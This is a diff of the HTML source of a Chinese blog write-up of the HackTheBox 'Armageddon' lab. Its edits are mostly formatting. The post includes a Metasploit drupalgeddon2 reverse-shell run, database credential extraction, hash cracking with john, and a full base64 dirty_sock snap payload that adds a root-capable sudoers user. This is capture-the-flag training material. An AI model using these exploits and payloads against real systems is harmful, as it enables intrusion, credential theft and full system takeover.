@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="Hackthebox">
-    <meta name="description" content="靶场信息                                                                                             image               靶场类型">
+    <meta name="description" content="靶场信息 靶场类型 信息搜集NMAP首先使用nmap进行扫描 nmap –A -sS –sC –Sv 10.10.10.233  我们可以看到开启了22和80端口 在80端口提示了我们存在robots.txt文件，并且东西很多 咱们访问一下  其中引起我兴趣的东西呢就是&#x2F;MAINTAINERS.txt文件了 这是维护文件，或者说是升级文件，咱们打开看一下  果不其然，里面揭露了Drupa">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Hackthebox - Armageddon 靶场实战">
 <meta property="og:url" content="http://www.lucifiel.com/2022/08/04/Armageddon/index.html">
 <meta property="og:site_name" content="Lucifiel&#39;s Blog">
-<meta property="og:description" content="靶场信息                                                                                             image               靶场类型">
+<meta property="og:description" content="靶场信息 靶场类型 信息搜集NMAP首先使用nmap进行扫描 nmap –A -sS –sC –Sv 10.10.10.233  我们可以看到开启了22和80端口 在80端口提示了我们存在robots.txt文件，并且东西很多 咱们访问一下  其中引起我兴趣的东西呢就是&#x2F;MAINTAINERS.txt文件了 这是维护文件，或者说是升级文件，咱们打开看一下  果不其然，里面揭露了Drupa">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://www.lucifiel.com/2022/08/04/Armageddon/image1.png">
 <meta property="og:image" content="http://www.lucifiel.com/2022/08/04/Armageddon/image2.png">
@@ -217,65 +217,23 @@
 
         </div>
         <div class="post-content" id="post-content" itemprop="postContent">
-            <h1 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h1><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2022/08/04/Armageddon/image1.png" alt="image" title>
-                </div>
-                <div class="image-caption">image</div>
-            </figure>
-
-<h1 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h1><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2022/08/04/Armageddon/image2.png" alt="image" title>
-                </div>
-                <div class="image-caption">image</div>
-            </figure>
-
+            <h1 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h1><p><img src="/2022/08/04/Armageddon/image1.png" alt="image"></p>
+<h1 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h1><p><img src="/2022/08/04/Armageddon/image2.png" alt="image"></p>
 <h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h2><p>首先使用nmap进行扫描</p>
 <p>nmap –A -sS –sC –Sv 10.10.10.233</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2022/08/04/Armageddon/image3.png" alt="image" title>
-                </div>
-                <div class="image-caption">image</div>
-            </figure>
-
+<p><img src="/2022/08/04/Armageddon/image3.png" alt="image"></p>
 <p>我们可以看到开启了22和80端口</p>
 <p>在80端口提示了我们存在robots.txt文件，并且东西很多 咱们访问一下</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2022/08/04/Armageddon/image4.png" alt="image" title>
-                </div>
-                <div class="image-caption">image</div>
-            </figure>
-
+<p><img src="/2022/08/04/Armageddon/image4.png" alt="image"></p>
 <p>其中引起我兴趣的东西呢就是&#x2F;MAINTAINERS.txt文件了</p>
 <p>这是维护文件，或者说是升级文件，咱们打开看一下</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2022/08/04/Armageddon/image5.png" alt="image" title>
-                </div>
-                <div class="image-caption">image</div>
-            </figure>
-
+<p><img src="/2022/08/04/Armageddon/image5.png" alt="image"></p>
 <p>果不其然，里面揭露了Drupal的版本</p>
 <p>到这里思路就明了了</p>
 <h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>咱们直接使用msf进行getshell</p>
 <p>使用msfconsole打开msf</p>
 <p>输入search drupal搜索可用的exp</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2022/08/04/Armageddon/image6.png" alt="image" title>
-                </div>
-                <div class="image-caption">image</div>
-            </figure>
-
+<p><img src="/2022/08/04/Armageddon/image6.png" alt="image"></p>
 <p>咱们对比一下版本号，最后一次升级为7.56版本，升级时间为2017-06-21 也就是说在这之前的exp都可以直接pass了</p>
 <p>咱们把目光放在2018-03-28的exp上</p>
 <pre><code>use exploit/unix/webapp/drupal_drupalgeddon2
@@ -288,74 +246,25 @@ set lhost 10.10.14.135
 
 exploit
 </code></pre>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2022/08/04/Armageddon/image7.png" alt="image" title>
-                </div>
-                <div class="image-caption">image</div>
-            </figure>
-
+<p><img src="/2022/08/04/Armageddon/image7.png" alt="image"></p>
 <p>成功获取到一个shell</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2022/08/04/Armageddon/image8.png" alt="image" title>
-                </div>
-                <div class="image-caption">image</div>
-            </figure>
-
+<p><img src="/2022/08/04/Armageddon/image8.png" alt="image"></p>
 <p>咱们运行一下无法查看到uid，但是可以查看到文件</p>
 <p>但我偏不，我就想知道当前用户怎么办？</p>
 <p>简单</p>
 <p>输入shell</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2022/08/04/Armageddon/image9.png" alt="image" title>
-                </div>
-                <div class="image-caption">image</div>
-            </figure>
-
+<p><img src="/2022/08/04/Armageddon/image9.png" alt="image"></p>
 <p>一开始我以为是卡住了，但后来想想不对，好像是获取到了</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2022/08/04/Armageddon/image10.png" alt="image" title>
-                </div>
-                <div class="image-caption">image</div>
-            </figure>
-
+<p><img src="/2022/08/04/Armageddon/image10.png" alt="image"></p>
 <p>执行命令后确认命令是可以被执行的？</p>
 <p>那咱们先想办法获得一个稳定的shell吧</p>
 <p>&#x2F;bin&#x2F;bash –i</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2022/08/04/Armageddon/image11.png" alt="image" title>
-                </div>
-                <div class="image-caption">image</div>
-            </figure>
-
+<p><img src="/2022/08/04/Armageddon/image11.png" alt="image"></p>
 <p>不一样被我搞到shell了，可给我NB坏了，叉会儿腰</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2022/08/04/Armageddon/image12.png" alt="image" title>
-                </div>
-                <div class="image-caption">image</div>
-            </figure>
-
+<p><img src="/2022/08/04/Armageddon/image12.png" alt="image"></p>
 <p>用户是apache，权限还是有点低啊，咱们在内核里看到了一个域名，或许有用，先记录下来吧，暂时还不知道是干嘛的，咱们得想想办法去搞到更高一点的权限</p>
 <p>我在查看源码和配置文件的时候，在..&#x2F;sites&#x2F;default&#x2F;settings.php中找到了数据库的账号密码</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2022/08/04/Armageddon/image13.png" alt="image" title>
-                </div>
-                <div class="image-caption">image</div>
-            </figure>
-
+<p><img src="/2022/08/04/Armageddon/image13.png" alt="image"></p>
 <pre><code>database =&gt; drupal
 
 username =&gt; drupaluser
@@ -363,98 +272,35 @@ username =&gt; drupaluser
 password =&gt; CQHEy@9M*m23gBVj
 </code></pre>
 <p>他不是开启了22端口吗，咱们直接ssh登录吧</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2022/08/04/Armageddon/image14.png" alt="image" title>
-                </div>
-                <div class="image-caption">image</div>
-            </figure>
-
+<p><img src="/2022/08/04/Armageddon/image14.png" alt="image"></p>
 <p>嗯？密码不对？啊这，就有点尴尬了呀</p>
 <p>没事儿，咱们换一种方法，既然从外面来不行，那咱们就从里面来，咳咳 没开车哈 请不要脑补</p>
 <p>在咱们的shell里直接使用mysql进行登录</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2022/08/04/Armageddon/image15.png" alt="image" title>
-                </div>
-                <div class="image-caption">image</div>
-            </figure>
-
+<p><img src="/2022/08/04/Armageddon/image15.png" alt="image"></p>
 <p>很奇怪，正常输入账号密码会卡住或者报错或者出现一些奇怪的东西</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2022/08/04/Armageddon/image16.png" alt="image" title>
-                </div>
-                <div class="image-caption">image</div>
-            </figure>
-
+<p><img src="/2022/08/04/Armageddon/image16.png" alt="image"></p>
 <p>经过多方测试以及查找资料后，得出正确的查询命令</p>
 <pre><code>mysql -u &quot;drupaluser&quot; -h &quot;localhost&quot; &quot;-pCQHEy@9M*m23gBVj&quot; &quot;drupal&quot; -e &quot;select uid, name, pass from users;&quot;
 </code></pre>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2022/08/04/Armageddon/image17.png" alt="image" title>
-                </div>
-                <div class="image-caption">image</div>
-            </figure>
-
+<p><img src="/2022/08/04/Armageddon/image17.png" alt="image"></p>
 <p>brucetherealadmin账户一看这么长就知道不简单，俗话说的好，长的人一定不简单，咋办？爆它！</p>
 <p>将用户brucetherealadmin的hash保存为一个文本文件</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2022/08/04/Armageddon/image18.png" alt="image" title>
-                </div>
-                <div class="image-caption">image</div>
-            </figure>
-
+<p><img src="/2022/08/04/Armageddon/image18.png" alt="image"></p>
 <p>请出我们的神器john</p>
 <pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt admin
 </code></pre>
 <p>爆破成功</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2022/08/04/Armageddon/image19.png" alt="image" title>
-                </div>
-                <div class="image-caption">image</div>
-            </figure>
-
+<p><img src="/2022/08/04/Armageddon/image19.png" alt="image"></p>
 <p>密码为booboo</p>
 <p>现在咱们直接ssh登录就可以了</p>
 <p>ssh <a href="mailto:brucetherealadmin@10.10.10.233">brucetherealadmin@10.10.10.233</a></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2022/08/04/Armageddon/image20.png" alt="image" title>
-                </div>
-                <div class="image-caption">image</div>
-            </figure>
-
+<p><img src="/2022/08/04/Armageddon/image20.png" alt="image"></p>
 <p>OK，咱们现在总算是有一个完整的用户权限了</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2022/08/04/Armageddon/image21.png" alt="image" title>
-                </div>
-                <div class="image-caption">image</div>
-            </figure>
-
+<p><img src="/2022/08/04/Armageddon/image21.png" alt="image"></p>
 <p>成功获得user权限的flag</p>
 <p><strong>权限提升</strong></p>
 <p>咱们使用sudo –l来查看一下sudo权限</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2022/08/04/Armageddon/image22.png" alt="image" title>
-                </div>
-                <div class="image-caption">image</div>
-            </figure>
-
+<p><img src="/2022/08/04/Armageddon/image22.png" alt="image"></p>
 <p>咱们可以不使用密码就调用root权限安装snap，那思路就有了呀，搞起来兄弟们</p>
 <p>生成一个snap的马</p>
 <p>参考链接：</p>
@@ -467,52 +313,17 @@ password =&gt; CQHEy@9M*m23gBVj
 <p>生成指令：</p>
 <pre><code>python2 -c &#39;print&quot;aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw&quot;+ &quot;A&quot;*4256 + &quot;==&quot;&#39; | base64 -d &gt; exploit.snap
 </code></pre>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2022/08/04/Armageddon/image23.png" alt="image" title>
-                </div>
-                <div class="image-caption">image</div>
-            </figure>
-
+<p><img src="/2022/08/04/Armageddon/image23.png" alt="image"></p>
 <p>直接运行改文件，发现还有一点错误，需要想办法解决一下</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2022/08/04/Armageddon/image24.png" alt="image" title>
-                </div>
-                <div class="image-caption">image</div>
-            </figure>
-
+<p><img src="/2022/08/04/Armageddon/image24.png" alt="image"></p>
 <p>加上 –devmode 成功安装</p>
 <p>sudo &#x2F;usr&#x2F;bin&#x2F;snap install –devmode exploit.snap</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2022/08/04/Armageddon/image25.png" alt="image" title>
-                </div>
-                <div class="image-caption">image</div>
-            </figure>
-
+<p><img src="/2022/08/04/Armageddon/image25.png" alt="image"></p>
 <p>切换到dirty_sock用户，密码也是dirty_sock</p>
 <p>查看一下权限</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2022/08/04/Armageddon/image26.png" alt="image" title>
-                </div>
-                <div class="image-caption">image</div>
-            </figure>
-
+<p><img src="/2022/08/04/Armageddon/image26.png" alt="image"></p>
 <p>提权成功</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/2022/08/04/Armageddon/image27.png" alt="image" title>
-                </div>
-                <div class="image-caption">image</div>
-            </figure>
-
+<p><img src="/2022/08/04/Armageddon/image27.png" alt="image"></p>
 <p>成功拿到root权限的flag</p>
 
         </div>
@@ -528,10 +339,6 @@ password =&gt; CQHEy@9M*m23gBVj
 </blockquote>
 
         
-<div class="page-reward">
-    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
-</div>
-
 
 
         <div class="post-footer">
@@ -660,22 +467,6 @@ password =&gt; CQHEy@9M*m23gBVj
 
 </article>
 
-<div id="reward" class="page-modal reward-lay">
-    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <h3 class="reward-title">
-        <i class="icon icon-quote-left"></i>
-        谢谢大爷~
-        <i class="icon icon-quote-right"></i>
-    </h3>
-    <div class="reward-content">
-        
-        <div class="reward-code">
-            <img id="rewardCode" src="/false" alt="打赏二维码">
-        </div>
-        
-    </div>
-</div>
-
 
 
 </div>
@@ -763,7 +554,7 @@ password =&gt; CQHEy@9M*m23gBVj
 
     <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
 <script>
-var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
 
 
 </script>
